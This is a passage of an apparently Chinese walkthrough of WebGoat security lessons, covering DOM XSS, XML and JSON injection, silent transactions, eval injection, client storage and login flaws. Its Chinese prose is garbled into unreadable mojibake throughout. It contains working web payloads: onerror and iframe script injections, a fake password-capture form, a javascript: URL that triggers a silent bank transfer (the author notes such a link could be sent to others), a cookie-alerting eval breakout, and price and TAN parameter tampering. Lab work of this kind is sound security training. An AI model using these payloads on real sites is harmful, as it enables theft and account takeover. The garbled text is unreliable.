<p>ÂØπ‰∫éÊ≠§ÁªÉ‰π†ÔºåÊÇ®ÁöÑ‰ªªÂä°ÊòØ‰ΩøÁî®Ê≠§ÊºèÊ¥ûÂ∞ÜÊÅ∂ÊÑè‰ª£Á†ÅÊ≥®ÂÖ•Âà∞ DOM ‰∏≠„ÄÇ ÁÑ∂ÂêéÂú®ÊúÄÂêéÈò∂ÊÆµÔºåÊÇ®Â∞ÜÁ∫†Ê≠£‰ª£Á†Å‰∏≠ÁöÑÁº∫Èô∑‰ª•Ëß£ÂÜ≥ÊºèÊ¥û„ÄÇ</p>
<p>DOM-XSS„ÄÇÊü•ÁúãÊ∫êÁ†Å‰∏≠ÁöÑ DOMXSS.js ÂèØÁü•ÔºåÈó≠Âêà <code>&lt;h1&gt;</code> Âç≥ÂèØ</p>
<p><code>&lt;h1&gt;&lt;img src='http://localhost:8080/WebGoat/images/logos/owasp.jpg'&lt;/img&gt;&lt;/h1&gt;</code></p>
<h4 id="stage-2-1">STAGE 2</h4>
<p>XSSÔºåÂà©Áî® JavaScript„ÄÇ‰∏îÈúÄË¶ÅÁî®Âà∞ onerror</p>
<p>onerror Â∞± onerror Âëó„ÄÇ„ÄÇ</p>
<p><code>&lt;h1&gt;&lt;img onerror="alert(1)" src&gt;5&lt;img&gt;&lt;/h1&gt;</code></p>
<h4 id="stage-3-1">STAGE 3</h4>
<p>ÈúÄË¶ÅÁî® <code>iframe</code>„ÄÇÈÇ£Â∞± <code>&lt;iframe javascript/onload</code></p>
<p><code>&lt;h1&gt;&lt;iframe javascript/onload="alert('xss')"&gt;&lt;iframe&gt;&lt;/h1&gt;</code></p>
<h4 id="stage-4-1">STAGE 4</h4>
<p>‰º™ÈÄ† Post Form</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>Please enter your password:<span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;I have your password: &#x27; + pass.value);&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BR</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h4 id="stage-5">STAGE 5</h4>
<p>‰ΩøÁî® <code>escape.js</code> ‰øÆÂ§çÂâçÈù¢ÁöÑÊºèÊ¥û</p>
<h3 id="lab-client-side-filtering">LAB: Client Side Filtering</h3>
<h4 id="stage-1-2">STAGE 1</h4>
<p>Èò∂ÊÆµ 1ÔºöÊÇ®‰ª•Â±±ÁæäÂ±±ÈáëËûçÂÖ¨Âè∏ÔºàCSOÔºâMoe Stooge ÁöÑË∫´‰ªΩÁôªÂΩï„ÄÇÊÇ®ÂèØ‰ª•ËÆøÈóÆÂÖ¨Âè∏‰ø°ÊÅØ‰∏≠ÁöÑÊØè‰∏™‰∫∫ÔºåÈô§‰∫Ü CEOÔºåÂÜÖÁª¥Â∞îÂ∑¥Â°ûÊ¥õÁº™„ÄÇÊàñËÄÖËá≥Â∞ë‰Ω†‰∏çÂ∫îËØ•ËÆøÈóÆ CEO ÁöÑ‰ø°ÊÅØ„ÄÇÂØπ‰∫éÊ≠§ÁªÉ‰π†ÔºåËØ∑Ê£ÄÊü•È°µÈù¢ÁöÑÂÜÖÂÆπÔºå‰ª•Êü•ÁúãÂèØ‰ª•ÊâæÂà∞ÁöÑÈ¢ùÂ§ñ‰ø°ÊÅØ„ÄÇ</p>
<p>ÂÆ°Êü•ÂÖÉÁ¥†ÂèØÊâæÂà∞</p>
<h4 id="stage-2-2">STAGE 2</h4>
<p>Èò∂ÊÆµ 2ÔºöÁé∞Âú®ÔºåËß£ÂÜ≥ÈóÆÈ¢ò„ÄÇ‰øÆÊîπÊúçÂä°Âô®Âè™ËøîÂõûÂèØ‰ª•ÁúãÂà∞ Mustache ÁöÑÁªìÊûú„ÄÇ</p>
<h3 id="dom-injection">DOM Injection</h3>
<p><em>ÊÇ®ÁöÑÂèóÂÆ≥ËÄÖÊòØ‰∏Ä‰∏™Á≥ªÁªüÔºåÈúÄË¶Å‰∏Ä‰∏™ÊøÄÊ¥ªÁ†ÅÊâçËÉΩËÆ©ÊÇ®‰ΩøÁî®ÂÆÉ„ÄÇ<br />
</em>ÊÇ®ÁöÑÁõÆÊ†áÂ∫îËØ•ÊòØÂ∞ùËØïÂêØÁî®ÊøÄÊ¥ªÊåâÈíÆ„ÄÇ<br />
*Ëä±‰∏Ä‰∫õÊó∂Èó¥Êü•Áúã HTML Ê∫ê‰ª£Á†ÅÔºå‰ª•‰∫ÜËß£ÂØÜÈí•È™åËØÅËøáÁ®ãÁöÑÂ∑•‰ΩúÂéüÁêÜ„ÄÇ</p>
<p>ÂêØÁî®ÊøÄÊ¥ªÊåâÈíÆÔºåÈÇ£‰πàÂè™ÈúÄË¶Å F12ÔºåÁÑ∂ÂêéÊâæ‰∏Ä‰∏ãËøô‰∏™ÊåâÈíÆÊòØÊÄé‰πàË¢´Á¶ÅÁî®ÁöÑ„ÄÇÂèØ‰ª•ÂèëÁé∞ <code>&lt;input disabled</code></p>
<p>Âà†Êéâ <code>disabled</code> Â∞±ÂèØ‰ª•ÁÇπÂáª‰∫Ü</p>
<h3 id="xml-injection">XML Injection</h3>
<p>AJAX Â∫îÁî®Á®ãÂ∫è‰ΩøÁî® XML ‰∏éÊúçÂä°Á´ØËøõË°å‰ø°ÊÅØ‰∫§‰∫í„ÄÇ‰ΩÜËØ• XML ÂÜÖÂÆπËÉΩÂ§üË¢´ÈùûÊ≥ïÁî®Êà∑ËΩªÊòìÊã¶Êà™Âπ∂ÁØ°Êîπ„ÄÇ</p>
<p>WebGoat-Miles ÁöÑ Miles Â•ñÂä±ÊòæÁ§∫‰∫ÜÊâÄÊúâÂèØÁî®ÁöÑÂ•ñÈáë„ÄÇ‰∏ÄÊó¶‰Ω†ÊàêÂäüÁôªÂΩïËá™Â∑±ÁöÑ IDÔºåÁ≥ªÁªüÂ∞ÜÊòæÁ§∫Âá∫‰Ω†ÁöÑË¥¶Âè∑‰ΩôÈ¢ùÂèäÂèØ‰ª•Ë¥≠‰π∞ÁöÑ‰∫ßÂìÅ„ÄÇ‰Ω†ÁöÑÁõÆÊ†áÊòØË¶ÅÂ∞ΩÈáè‰∏∫Ëá™Â∑±Ê∑ªÂä†Êõ¥Â§öÁöÑÂ•ñÂä±„ÄÇ‰Ω†ÁöÑÂ∏êÊà∑ ID ÊòØ 8362390</p>
<p>ÂêéÂè∞ÊääÂÖëÊç¢Â•ñÂä±ÊâÄÈúÄÂ•ñÈáëÊï∞È¢ùÂ∞è‰∫éËá™Â∑±Êã•ÊúâÁöÑÂ∏êÂè∑‰ΩôÈ¢ùÁöÑÁâ©ÂìÅËøîÂõûÔºåÁÑ∂ÂêéÊòæÁ§∫Âú® html ‰∏≠ÔºåËÄåÊàë‰ª¨Âè™ÈúÄË¶ÅÊäìÂåÖÊîπ check ÂêéÈù¢ÁöÑÊï∞Â≠óÂç≥ÂèØ</p>
<p><code>check1004=on</code></p>
<p>‰∏∫‰ªÄ‰πàÊòØ 1004 Âë¢Ôºà1005 ‰πüÂèØ‰ª•ÔºâÔºåÂú® <code>xmlInjection.js</code> ÈáåÔºö</p>
<p><code>strHTML = strHTML + '&lt;tr&gt;&lt;td&gt;&lt;input name=\"check' + (i + 1001) + '\" type=\"checkbox\"&gt;&lt;/td&gt;&lt;td&gt;';</code></p>
<h3 id="json-injection">JSON Injection</h3>
<p>JavaScript Object Notation (JSON)ÊòØ‰∏ÄÁßçÁÆÄÂçïÁöÑËΩªÈáèÁ∫ßÁöÑÊï∞ÊçÆ‰∫§Êç¢Ê†ºÂºèÔºåJSON ÂèØ‰ª• ‰ª•ÂæàÂ§öÂΩ¢ÂºèÂ∫îÁî®ÔºåÂ¶Ç:Êï∞ÁªÑÔºåÂàóË°®ÔºåÂìàÂ∏åË°®ÂíåÂÖ∂‰ªñÊï∞ÊçÆÁªìÊûÑ„ÄÇJSON ÂπøÊ≥õÂ∫îÁî®‰∫é AJAX Âíå web2.0 Â∫îÁî®„ÄÇÁõ∏ÊØî XML, JSON ÂæóÂà∞Á®ãÂ∫èÂëòÁöÑÊõ¥Â§öÁöÑÈùíÁùêÔºåÂõ†‰∏∫ÂÆÉ‰ΩøÁî®Êõ¥ÁÆÄÂçïÔºåÈÄüÂ∫¶Êõ¥Âø´„ÄÇ ‰ΩÜÊòØ‰∏é XML ‰∏ÄÊ†∑ÂÆπÊòìÂèóÂà∞Ê≥®ÂÖ•ÊîªÂáªÔºåÊÅ∂ÊÑèÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂú®ËØ∑Ê±ÇÂìçÂ∫î‰∏≠Ê≥®ÂÖ•‰ªªÊÑèÂÄº„ÄÇ</p>
<p>‰Ω†Âç≥Â∞Ü‰ªé Boston(Êú∫Âú∫‰ª£Á†Å BOS)È£ûÂæÄ Seattle(Êú∫Âú∫‰ª£Á†Å SEA)„ÄÇ‰∏ÄÊó¶‰Ω†ËæìÂÖ•Êú∫Âú∫‰ª£Á†ÅÁöÑ‰∏â‰∏™Â≠óÊØçÂêéÔºåÊµèËßàÂô®Â∞ÜÂêëÊúçÂä°Á´ØÂèëÈÄÅ AJAX ËØ∑Ê±ÇÊü•ËØ¢Ëà™Áè≠ÂíåÊú∫Á•®‰ª∑Ê†º„ÄÇ‰Ω†Â∞ÜÂèëÁé∞Êúâ‰∏§‰∏™Ëà™Áè≠ÂèØ‰ª•ÈÄâÊã©:Áõ¥ËææËà™Áè≠Ôºå‰ª∑Ê†ºË¥µ;ÁªèÂÅú 2 Ê¨°ÁöÑËΩ¨Êú∫Ëà™Áè≠Ôºå‰ª∑Ê†º‰æøÂÆú„ÄÇ‰Ω†ÁöÑÁõÆÊ†áÊòØ:Ë¥≠‰π∞Áõ¥ËææËà™Áè≠ÁöÑÊú∫Á•®Ôºå‰ΩÜË¶Å‰ΩøÁî®Êõ¥‰æøÂÆúÁöÑ‰ª∑Ê†º„ÄÇ</p>
<p>ÊäìÂåÖÂç≥ÂèØ„ÄÇ‰∏çËøáÊÉ≥ÂΩìÁÑ∂Âú∞‰ª•‰∏∫ <code>price2Submit</code> ‰πüË¶ÅÊîπÔºåÊ≤°ÊÉ≥Âà∞‰∏çÁî®„ÄÇ</p>
<h3 id="silent-transactions-attacks">Silent Transactions Attacks</h3>
<p>ÈùôÈªò‰∫§ÊòìÊîªÂáª(Silent Transactions Attacks)</p>
<p>ÂØπÂÆ¢Êà∑Á´ØÊù•ËØ¥Ôºå‰ªª‰Ωï‰∏Ä‰∏™ÈùôÈªò‰∫§ÊòìÊîªÂáªÔºå‰ΩøÁî®Âçï‰∏ÄÊèê‰∫§ÁöÑÁ≥ªÁªüÈÉΩÊòØÊúâÂç±Èô©ÁöÑ„ÄÇ‰∏æ‰æãÊù•ËØ¥ÔºåÂ¶ÇÊûú‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑ web Â∫îÁî®ÂÖÅËÆ∏‰∏Ä‰∏™ÁÆÄÂçïÁöÑ URL Êèê‰∫§Ôºå‰∏Ä‰∏™È¢ÑËÆæ‰ºöËØùÊîªÂáªÂ∞ÜÂÖÅËÆ∏ÊîªÂáªËÄÖÂú®Ê≤°ÊúâÁî®Êà∑ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÂÆåÊàê‰∫§Êòì„ÄÇÂú® Ajax ÈáåÊÉÖÂÜµ‰ºöÂèòÂæóÊõ¥Á≥üÁ≥ï:‰∫§ÊòìÊòØ‰∏çÁü•‰∏çËßâÁöÑÔºå‰∏ç‰ºöÂú®È°µÈù¢‰∏äÁªôÁî®Êà∑ÂèçÈ¶àÔºåÊâÄ‰ª•Ê≥®ÂÖ•ÁöÑÊîªÂáªËÑöÊú¨ÂèØ‰ª•Âú®Áî®Êà∑Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ã‰ªéÂÆ¢Êà∑Á´ØÊääÈí±ÂÅ∑Ëµ∞„ÄÇ</p>
<p>ËøôÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÈì∂Ë°åËΩ¨Ë¥¶ÁΩëÈ°µÔºåÂú®È°µÈù¢‰∏äÂèØ‰ª•ËøõË°åËΩ¨Ë¥¶Êìç‰Ωú; ÂΩìÂâçÈ°µÈù¢ÊòæÁ§∫‰∫Ü‰Ω†ÁöÑË¥¶Âè∑‰ΩôÈ¢ù„ÄÅÂΩìÂâçË¥¶Âè∑ÂíåÁõÆÊ†áËΩ¨Ë¥¶Â∏êÂè∑; ËØ•Â∫îÁî®Á®ãÂ∫èÂú®ÈÄöËøá‰∏Ä‰∫õÂü∫Êú¨È™åËØÅÂêé‰ΩøÁî® AJAX ÊäÄÊúØÊèê‰∫§ËΩ¨Ë¥¶Êìç‰Ωú; ‰Ω†ÁöÑÁõÆÊ†áÊòØÁªïËøáÁî®Êà∑È™åËØÅÔºåÊâßË°åÈùôÈªòËΩ¨Ë¥¶Êìç‰Ωú„ÄÇ</p>
<p>Âú® url ÂêéÈù¢ËæìÂÖ• <code>javascript:submitData(1234556,11000)</code> Âç≥ÂèØ</p>
<p>ÂÖ∂ÂÆûËøôÈ¢òÂ∞±ÂÉè‰∏Ä‰∏™ÂèçÂ∞ÑÂûãÁöÑ XSSÔºå‰Ω†ÂèØ‰ª•ÊääËøô‰∏™ÈìæÊé•ÂèëÁªôÂÖ∂‰ªñ‰∫∫ÔºåÁÇπÂáªËøô‰∏™ÈìæÊé•ÁöÑ‰∫∫Â∞±‰ºöÊääÈí±ËΩ¨ÂÖ•‰Ω†ÁöÑÂ∏êÂè∑ÔºàÂõ†‰∏∫Ê≤°Êúâ‰ªª‰ΩïÈ™åËØÅ</p>
<h3 id="dangerous-use-of-eval">Dangerous Use of Eval</h3>
<p>Âç±Èô©Êåá‰ª§‰ΩøÁî®„ÄÇÂú®ÊúçÂä°Á´ØÈ™åËØÅÊâÄÊúâÁî®Êà∑ËæìÂÖ•ÁöÑ‰ø°ÊÅØÔºåËøôÊòØ‰∏Ä‰∏™‰∏çÈîôÁöÑÂÅöÊ≥ï„ÄÇÂ¶ÇÊûúÊú™È™åËØÅÁöÑÁî®Êà∑ËæìÂÖ•Áõ¥Êé•ÈÄöËøá HTTP ÂìçÂ∫îËøîÂõûÁªôÂÆ¢Êà∑Á´ØÁöÑËØùÔºåÂæÄÂæÄ‰ºöËß¶Âèë XSS ÊîªÂáª„ÄÇ Âú®Ëøô‰∏ÄËØæ‰∏≠ÔºåÊú™È™åËØÅÁöÑÁî®Êà∑Êèê‰æõÁöÑÊï∞ÊçÆÁªìÂêà‰∫Ü JavaScript ÁöÑ eval()Ë∞ÉÁî®‰∏ÄËµ∑‰ΩøÁî®„ÄÇÂú®ÂèçÂ∞ÑÂûã XSS ÊîªÂáª‰∏≠ÔºåÊîªÂáªËÄÖÂèØ‰ª•ÊûÑÈÄ†Â∏¶ÊúâÊîªÂáªËÑöÊú¨ÁöÑ URLÔºåÂ∞ÜÂÖ∂Â≠òÂÇ®‰∫éÂÖ∂‰ªñÁ´ôÁÇπÔºåÈÄöËøáÁîµÂ≠êÈÇÆ‰ª∂ÔºåÊàñËÄÖÂÖ∂‰ªñÊñπÂºèËØ±È™óÁî®Êà∑ÁÇπÂáªÔºåËææÂà∞ XSS ÁöÑÁõÆÁöÑ„ÄÇHTML ÁΩëÈ°µÊúâ‰∏ÄÁ≥ªÂàóÁöÑ HTML ÁºñËæëËØ≠Ë®ÄÂíåÂ≠óÁ¨¶ÁªÑÂêàÂÆåÊàê„ÄÇÂú®Ê∫ê‰ª£Á†Å‰∏≠‰ªªÊÑè‰ΩçÁΩÆÊ∑ªÂä†‰∏ÄÂÆöÁöÑ‰ª£Á†ÅÈÉΩÊúâÂèØËÉΩË¢´ÊµèËßàÂô®Ëß£ÊûêÔºåÁâπÂà´ÊòØ HTML ‰∏≠ÁöÑÊ†áËÆ∞Â≠óÁ¨¶ÂíåÂ±ûÊÄßÁ≠â‰ø°ÊÅØÔºåÂ¶Ç: <code>&lt;input name="submit" type="submit" value"Êèê‰∫§"/&gt;</code></p>
<p>Êú¨ÁªÉ‰π†ËØæÁ®ã‰∏≠Ôºå‰Ω†ÁöÑ‰ªªÂä°ÊòØÈÄöËøáÊûÑÈÄ†ÁâπÊÆäÁöÑËæìÂÖ•ÔºåÂú®Â∫îÁî®Á®ãÂ∫èËøêË°åËøáÁ®ã‰∏≠ÊâßË°åÊÅ∂ÊÑèËÑöÊú¨„ÄÇË¶ÅÈÄöËøáÊú¨ËØæÁ®ãÔºåÂøÖÈ°ªÈÄöËøá alert()ÂáΩÊï∞ÊòæÁ§∫Âá∫ document.cookie</p>
<p><code>digit access code</code> ÂèØ‰ª•ÂºπÔºö<code>');alert(document.cookie%2b'</code></p>
<p><code>credit card number</code> ÂΩìÁÑ∂‰πüÂèØ‰ª•ÂºπÔºåÈó≠ÂêàÈ∫ªÁÉ¶‰∫ÜÁÇπÂ∞±ÊòØ‰∫Ü</p>
<h3 id="insecure-client-storage">Insecure Client Storage</h3>
<p>Âú®ÊúçÂä°Á´ØÈ™åËØÅÊâÄÊúâÁöÑÁî®Êà∑ËæìÂÖ•‰ø°ÊÅØÊÄªÊòØ‰∏çÈîôÁöÑÂÅöÊ≥ï„ÄÇÂÆ¢Êà∑Á´ØËøõË°åÁöÑ‰ªª‰ΩïÈ™åËØÅ‰ø°ÊÅØÈÉΩÂ≠òÂú®Ë¢´ÈÄÜÂêëÂàÜÊûêÁöÑËÑÜÂº±ÊÄß„ÄÇËÆ∞‰ΩèÔºåÂÆ¢Êà∑Á´ØÁöÑ‰ªª‰ΩïÊï∞ÊçÆÈÉΩ‰∏çËÉΩË¢´ËßÜ‰∏∫Êú∫ÂØÜ!</p>
<p>ÂÆ¢Êà∑Á´Ø HTML Âíå JavaScrip ËØ≠Âè•ÂèØ‰ª•ÂØπÁΩëÈ°µÂÜÖÂÆπ„ÄÅÂΩ¢ÂºèÂÅö‰øÆÊîπÔºåÂ¶ÇÈöêËóè„ÄÅÊéßÂà∂ËØªÂÜô„ÄÅÈôêÂà∂ÈïøÂ∫¶Á≠â„ÄÇÂêåÊ†∑ÔºåÈÄöËøá‰øÆÊîπÁΩëÈ°µ‰ª£Á†Å‰πüËÉΩËß£Èô§Ê≠§Á±ªÈôêÂà∂„ÄÇ</p>
<h4 id="stage-1ÂèëÁé∞Ë¥≠Áâ©‰ºòÊÉ†Á†Å">Stage 1:ÂèëÁé∞Ë¥≠Áâ©‰ºòÊÉ†Á†Å</h4>
<p>ËøõÂÖ• <code>clientSideValidation.js</code> ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞ <code>isValidCoupon</code> ÂáΩÊï∞Áî®‰∫éÈ™åËØÅ‰ºòÊÉ†Á†ÅÊòØÂê¶Ê≠£Á°Æ„ÄÇÈÇ£‰πàÊàë‰ª¨ÊääËøô‰∏ÄÊÆµÂíå <code>var coupons</code> Êä†Âá∫Êù•ÔºåÂä†‰∏ä <code>alert(decrypted)</code>:</p>
<p><code>PLATINUM GOLD SILVER BRONZE PRESSONE PRESSTWO</code> Èöè‰æøÂ°´‰∏Ä‰∏™Â∞±Ë°å</p>
<h4 id="stage-2Êèê‰∫§ÂÖçË¥πËÆ¢Âçï">Stage 2:Êèê‰∫§ÂÖçË¥πËÆ¢Âçï</h4>
<p>Áî±‰∫éÂïÜÂìÅÂàóË°®‰∏≠ÂïÜÂìÅ‰ª∑Ê†ºÂ≠óÊÆµ‰∏∫Âè™ËØªÔºåÂõ†Ê≠§Êó†Ê≥ï‰øÆÊîπ„ÄÇÁé∞Âú®‰Ω†ÈúÄË¶ÅÂº∫Âà∂‰øÆÊîπ redit card ‰ª•Âèä shopping card ‰∏≠‰ª∑Ê†ºÁöÑÂ±ûÊÄß„ÄÇ</p>
<p>Êîπ <code>GRANDTOT</code> ÂèÇÊï∞Âç≥ÂèØ</p>
<p>ÊàñËÄÖÂú® HTML ‰∏≠ÊâæÂà∞ <code>readonly=""</code>ÔºåÂà†Èô§ËØ•Â±ûÊÄßÔºåÂ∞±ÂèØ‰ª•Âú®È°µÈù¢‰∏ä‰øÆÊîπÂïÜÂìÅ‰ª∑Ê†º‰∫Ü</p>
<h3 id="same-origin-policy-protection">Same Origin Policy Protection</h3>
<p>ÂêåÊ∫êÁ≠ñÁï•‰øùÊä§„ÄÇÊú¨ÁªÉ‰π†ÊºîÁ§∫‰∫ÜÂêåÊ∫êÁ≠ñÁï•‰øùÊä§„ÄÇ XHR ËØ∑Ê±ÇÂè™ËÉΩ‰º†ÂõûÂéüÂßãÊúçÂä°Âô®„ÄÇ Â∞ùËØïÂ∞ÜÊï∞ÊçÆ‰º†ÈÄíÂà∞ÈùûÂßãÂèëÊúçÂä°Âô®Â∞ÜÂ§±Ë¥•„ÄÇ</p>
<p>ËøõË°åÂ∞ùËØïÂç≥ÂèØ</p>
<h2 id="authentication-flaws">Authentication Flaws</h2>
<h3 id="password-strength">Password Strength</h3>
<p>ÊÇ®ÁöÑ Web Â∫îÁî®Á®ãÂ∫èÁöÑÂ∏êÊà∑Âè™‰∏éÂØÜÁ†Å‰∏ÄÊ†∑ÂÆâÂÖ®„ÄÇ ÂØπ‰∫éËøô‰∏™ÁªÉ‰π†Ôºå‰Ω†ÁöÑÂ∑•‰ΩúÊòØÂú® https://howsecureismypassword.net ‰∏äÊµãËØïÂá†‰∏™ÂØÜÁ†Å„ÄÇ ÊÇ®ÂøÖÈ°ªÂêåÊó∂ÊµãËØïÊâÄÊúâ 6 ‰∏™ÂØÜÁ†Å...<br />
Âú®ÊÇ®ÁöÑÂ∫îÁî®Á®ãÂ∫è‰∏≠ÔºåÊÇ®Â∫îËØ•ËÆæÁΩÆÂ•ΩÂØÜÁ†ÅË¶ÅÊ±ÇÔºÅ</p>
<p>ËøôÈ¢òÁ≠îÊ°àÂíåÁΩëÁ´ôÁªôÂá∫ÁöÑ‰∏ç‰∏ÄÊ†∑„ÄÇ„ÄÇ</p>
<h3 id="forgot-password">Forgot Password</h3>
<p>Web Â∫îÁî®Á®ãÂ∫èÁªèÂ∏∏‰∏∫Áî®Êà∑Êèê‰æõÊ£ÄÁ¥¢Ë¢´ÈÅóÂøòÂØÜÁ†ÅÁöÑËÉΩÂäõ„ÄÇ ‰∏çÂπ∏ÁöÑÊòØÔºåËÆ∏Â§ö Web Â∫îÁî®Á®ãÂ∫èÊó†Ê≥ïÊ≠£Á°ÆÂÆûÁé∞ËØ•Êú∫Âà∂„ÄÇ È™åËØÅÁî®Êà∑Ë∫´‰ªΩÊâÄÈúÄÁöÑ‰ø°ÊÅØÈÄöÂ∏∏Ëøá‰∫éÁÆÄÂçï„ÄÇ</p>
<p>ÊÄªÁõÆÊ†áÔºö</p>
<p>Â¶ÇÊûúÁî®Êà∑ÂèØ‰ª•Ê≠£Á°ÆÂõûÁ≠îÁßòÂØÜÈóÆÈ¢òÔºåÁî®Êà∑ÂèØ‰ª•Ê£ÄÁ¥¢‰ªñ‰ª¨ÁöÑÂØÜÁ†Å„ÄÇ Ê≠§‚ÄúÂøòËÆ∞ÂØÜÁ†Å‚ÄùÈ°µÈù¢‰∏äÊ≤°ÊúâÈîÅÂÆöÊú∫Âà∂„ÄÇ ‰Ω†ÁöÑÁî®Êà∑ÂêçÊòØ'webgoat'Ôºå‰Ω†ÊúÄÂñúÊ¨¢ÁöÑÈ¢úËâ≤ÊòØ'Á∫¢Ëâ≤'„ÄÇ ÁõÆÊ†áÊòØÊ£ÄÁ¥¢Âè¶‰∏Ä‰∏™Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ</p>
<p>Ëøá‰∫éÁÆÄÂçïÁöÑÈ™åËØÅÈóÆÈ¢ò+Êó†ÈîÅÂÆöÊú∫Âà∂ÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Êö¥Á†¥</p>
<p>ÊâãÂä®ËØïËØïÂá†‰∏™Â∏∏Áî®ÁöÑÂ∞±ÂèØ‰ª•ËØïÂá∫Êù• <code>green</code></p>
<h3 id="multi-level-login-2">Multi Level Login 2</h3>
<p>‰Ω†ÊòØ‰∏Ä‰∏™Âè´ Joe ÁöÑÊîªÂáªËÄÖ„ÄÇ ÊÇ®Êã•Êúâ webgoat financial ÁöÑÊúâÊïàÂ∏êÊà∑„ÄÇ ‰Ω†ÁöÑÁõÆÊ†áÊòØ‰ª• Jane ÁôªÂΩï„ÄÇ ‰Ω†ÁöÑÁî®Êà∑ÂêçÊòØ JoeÔºå‰Ω†ÁöÑÂØÜÁ†ÅÊòØ banana„ÄÇ</p>
<p>ÂÖàÁî® Joe ÁöÑÂ∏êÂè∑ÁôªÈôÜÔºåÂú®ËæìÂÖ• Tank ÂêéÊäìÂåÖÔºåÊää Joe Êîπ‰∏∫ Jane</p>
<h3 id="multi-level-login-1">Multi Level Login 1</h3>
<h4 id="stage-1-3">STAGE 1</h4>
<p>Á¨¨‰∏ÄÈò∂ÊÆµÔºöËøô‰∏™Èò∂ÊÆµÂè™ÊòØ‰∏∫‰∫ÜÂ±ïÁ§∫ÁªèÂÖ∏ÁöÑÂ§öÁôªÂΩïÊòØÂ¶Ç‰ΩïÂ∑•‰ΩúÁöÑ„ÄÇ ‰Ω†ÁöÑÁõÆÊ†áÊòØÁî®ÂØÜÁ†Å tarzan ‰Ωú‰∏∫ Jane ËøõË°åÂ∏∏ËßÑÁôªÂΩï„ÄÇ</p>
<p>ËæìÂÖ•Áî®Êà∑ÔºåÂØÜÁ†ÅÔºåtank Âç≥ÂèØ</p>
<h4 id="stage-2-3">STAGE 2</h4>
<p>Èò∂ÊÆµ 2ÔºöÁé∞Âú®‰Ω†ÊòØ‰∏Ä‰∏™ÈªëÂÆ¢Ôºå‰ªñÂ∑≤ÁªèÈÄöËøáÈíìÈ±ºÈÇÆ‰ª∂‰ªé Jane Á™ÉÂèñ‰∫Ü‰∏Ä‰∫õ‰ø°ÊÅØ„ÄÇ ‰Ω†ÊúâÂØÜÁ†ÅÊòØ tarzan Âíå Tan ÔºÉ 1 ÊòØ 15648<br />
ÈóÆÈ¢òÊòØÔºåÁ¨¨‰∏Ä‰∏™ tan Â∑≤ÁªèË¢´‰ΩøÁî®‰∫Ü...ËØïÂõæÈóØÂÖ•Á≥ªÁªü„ÄÇ</p>
<p>ÊäìÂåÖÂèØÁü•Êúâ‰∏Ä‰∏™ÂèÇÊï∞ÊòØ <code>hidden_tan</code>, Êîπ‰∏∫ 1ÔºåÁÑ∂Âêé <code>tan</code> ‰∏∫ 15648</p>
<h2 id="buffer-overflows">Buffer Overflows</h2>
<h3 id="off-by-one-overflows">Off-by-One Overflows</h3>
<p>Â¶Ç‰ΩïÂà©Áî®ÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û</p>
<p>Â¶Ç‰ΩïÂà©Áî®Âü∫‰∫é Web ÁöÑ‚ÄúOff-by-One‚ÄùÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄÇ<br />
ÊîªÂáªÂ¶Ç‰ΩïÂ∑•‰ΩúÔºö</p>
